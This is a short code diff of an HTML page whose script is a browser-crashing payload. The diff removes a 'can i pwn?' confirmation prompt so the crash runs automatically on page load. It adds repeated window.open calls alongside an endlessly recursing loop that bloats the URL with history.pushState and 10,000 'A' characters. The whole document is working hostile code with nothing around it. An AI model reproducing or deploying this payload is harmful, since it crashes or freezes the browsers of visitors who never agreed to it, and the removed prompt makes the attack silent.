@@ -2,13 +2,10 @@
 <body>
 <script>
 function doCrash() {
-    setInterval(history.pushState(0,0,location.href+location.href+"A".repeat(10000)),300);    
+    setInterval(function f() {window.open(location.href); history.pushState(0,0,location.href+location.href+"A".repeat(10000))},7000);    
     doCrash();
 };
-pwn = confirm("can i pwn? ");
-if (pwn) {
-    doCrash();
-}
+doCrash();
 </script>
 </body>
 </html>
